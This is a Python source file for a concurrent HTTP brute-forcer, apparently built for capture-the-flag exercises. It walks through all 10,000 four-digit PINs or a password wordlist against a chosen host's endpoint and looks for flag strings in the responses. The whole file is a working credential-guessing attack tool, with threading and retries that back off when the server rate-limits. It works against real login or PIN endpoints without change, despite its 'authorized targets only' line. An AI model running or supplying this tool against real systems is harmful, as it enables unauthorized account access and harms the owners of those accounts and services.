#!/usr/bin/env python3
import argparse
import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from threading import Lock


BANNER = r"""
   _______   __    _____  ___       ___________  _______   ________  ___________  _______   _______   
  |   __ "\ |" \  (\"   \|"  \     ("     _   ")/"     "| /"       )("     _   ")/"     "| /"      \  
  (. |__) :)||  | |.\\   \    |     )__/  \\__/(: ______)(:   \___/  )__/  \\__/(: ______)|:        | 
  |:  ____/ |:  | |: \.   \\  |        \\_ /    \/    |   \___  \       \\_ /    \/    |  |_____/   ) 
  (|  /     |.  | |.  \    \. |        |.  |    // ___)_   __/  \\      |.  |    // ___)_  //      /  
 /|__/ \    /\  |\|    \    \ |        \:  |   (:      "| /" \   :)     \:  |   (:      "||:  __   \  
(_______)  (__\_|_)\___|\____\)         \__|    \_______)(_______/       \__|    \_______)|__|  \___) 
                                                                                                          
                                                              
"""

DESCRIPTION = "Concurrent brute-forcer: 4-digit PIN or dictionary mode — authorized targets only."

DEFAULT_THREADS = 10

def parse_args():
    p = argparse.ArgumentParser()
    p.add_argument("--mode", "-M", choices=["pin", "dict"], required=True)
    p.add_argument("--host", "-H", help="Target IP/host (interactive if omitted)")
    p.add_argument("--port", "-P", type=int, help="Target port (interactive if omitted)")
    p.add_argument("--endpoint", "-e", default=None)
    p.add_argument("--param", "-k", default=None)
    p.add_argument("--method", "-m", choices=["GET", "POST"], default="GET")
    p.add_argument("--https", action="store_true")
    p.add_argument("--threads", "-t", type=int, default=DEFAULT_THREADS)
    p.add_argument("--timeout", type=float, default=5.0)
    p.add_argument("--delay", type=float, default=0.0)
    p.add_argument("--retries", type=int, default=3)
    p.add_argument("--flag-key", default="flag")
    p.add_argument("--stop-on-found", action="store_true")
    p.add_argument("--wordlist", "-w", help="Local file path or URL (dict mode). If omitted uses small default.")
    return p.parse_args()

def interactive_inputs(args):
    if not args.host:
        args.host = input("IP/Host: ").strip()
    if not args.port:
        while True:
            try:
                args.port = int(input("Port: ").strip())
                break
            except ValueError:
                print("Please enter a numeric port.")
    if not args.endpoint:
        v = input("Endpoint (e.g., /pin or /dictionary): ").strip()
        args.endpoint = v or ("/pin" if args.mode=="pin" else "/dictionary")
    if not args.param:
        v = input("Parameter name (e.g., pin or password): ").strip()
        args.param = v or ("pin" if args.mode=="pin" else "password")
    if args.mode == "dict" and not args.wordlist:
        wl = input("Wordlist (local path or URL, leave empty for small default): ").strip()
        args.wordlist = wl or None
    return args

def load_wordlist(path_or_url):
    if not path_or_url:
        return ["password","123456","12345678","qwerty","letmein"]
    if path_or_url.startswith("http://") or path_or_url.startswith("https://"):
        r = requests.get(path_or_url, timeout=10)
        r.raise_for_status()
        return [line.rstrip("\n") for line in r.text.splitlines() if line.strip()]
    else:
        with open(path_or_url, "r", encoding="utf-8", errors="ignore") as f:
            return [line.rstrip("\n") for line in f if line.strip()]

def make_request(session, method, url, params_or_data, timeout, retries):
    attempt = 0
    backoff = 0.5
    while attempt <= retries:
        try:
            if method == "GET":
                r = session.get(url, params=params_or_data, timeout=timeout)
            else:
                r = session.post(url, data=params_or_data, timeout=timeout)
        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
            attempt += 1
            time.sleep(backoff)
            backoff *= 2
            continue
        if r.status_code == 429:
            attempt += 1
            time.sleep(backoff)
            backoff *= 2
            continue
        if 500 <= r.status_code < 600:
            attempt += 1
            time.sleep(backoff)
            backoff *= 2
            continue
        try:
            return r.status_code, r.json()
        except ValueError:
            return r.status_code, r.text
    return None, None

def worker_task(item, base_url, method, param_name, session, timeout, retries, delay, flag_key, mode):
    params_or_data = {param_name: item}
    status, data = make_request(session, method, base_url, params_or_data, timeout, retries)
    if delay:
        time.sleep(delay)
    if isinstance(data, dict) and flag_key in data:
        return item, data[flag_key], status, data
    if isinstance(data, str) and data.strip():
        low = data.lower()
        if "flag" in low or "ctf{" in low or ("{" in data and "}" in data):
            return item, data.strip(), status, data
    return item, None, status, data

def run_mode(pairs, base_url, method, param_name, args):
    session = requests.Session()
    session.headers.update({"User-Agent":"BruteForcer/1.0"})
    found = []
    lock = Lock()
    try:
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = []
            idx = 0
            total = len(pairs)
            while idx < total and len(futures) < args.threads:
                item = pairs[idx]
                fut = ex.submit(worker_task, item, base_url, method, param_name, session, args.timeout, args.retries, args.delay, args.flag_key, args.mode)
                futures.append((fut, item))
                idx += 1
            last_shown = None
            while futures:
                done, _ = wait([f for f, _ in futures], return_when=FIRST_COMPLETED, timeout=1.0)
                new_futures = []
                for fut, item in futures:
                    if fut in done:
                        try:
                            item_str, flag_val, status, body = fut.result()
                        except Exception as e:
                            with lock:
                                print(f"\n[!] {item} -> exception: {e}")
                            item_str, flag_val = item, None
                        if flag_val:
                            with lock:
                                print()
                                if args.mode == "pin":
                                    print(f"Correct PIN found: {item_str}")
                                else:
                                    print(f"Correct password found: {item_str}")
                                display_flag = flag_val if isinstance(flag_val, str) else str(flag_val)
                                if len(display_flag) > 300:
                                    display_flag = display_flag[:300] + " ... (truncated)"
                                print(f"Flag: {display_flag}")
                                found.append((item_str, display_flag))
                            if args.stop_on_found:
                                print("\nStopping because --stop-on-found was set.")
                                return found
                        else:
                            with lock:
                                label = "Attempted PIN" if args.mode=="pin" else "Attempted password"
                                print(f"{label}: {item_str}", end="\r", flush=True)
                                last_shown = item_str
                        if idx < total:
                            next_item = pairs[idx]
                            nfut = ex.submit(worker_task, next_item, base_url, method, param_name, session, args.timeout, args.retries, args.delay, args.flag_key, args.mode)
                            new_futures.append((nfut, next_item))
                            idx += 1
                    else:
                        new_futures.append((fut, item))
                futures = new_futures
            with lock:
                print()
            return found
    except KeyboardInterrupt:
        print("\nInterrupted by user. Exiting.")
        sys.exit(1)

def main():
    args = parse_args()
    args = interactive_inputs(args)
    scheme = "https" if args.https else "http"
    endpoint = args.endpoint if args.endpoint.startswith("/") else "/" + args.endpoint
    base_url = f"{scheme}://{args.host}:{args.port}{endpoint}"
    method = args.method.upper()
    param_name = args.param
    print(BANNER)
    print(DESCRIPTION)
    print("-" * max(len(DESCRIPTION), 40))
    print(f"Target: {base_url}  Method: {method}  Param: {param_name}")
    print(f"Threads: {args.threads}, timeout: {args.timeout}s, retries: {args.retries}, delay: {args.delay}s")
    print("Starting... (Ctrl-C to stop)\n")
    if args.mode == "pin":
        items = [f"{i:04d}" for i in range(10000)]
    else:
        try:
            items = load_wordlist(args.wordlist)
        except Exception as e:
            print(f"Failed to load wordlist: {e}")
            sys.exit(1)
    results = run_mode(items, base_url, method, param_name, args)
    if results:
        print(f"Finished. Found {len(results)} result(s):")
        for itm, flag in results:
            print(f" - {itm} -> {flag}")
    else:
        print("Finished. No flags found.")

if __name__ == "__main__":
    main()
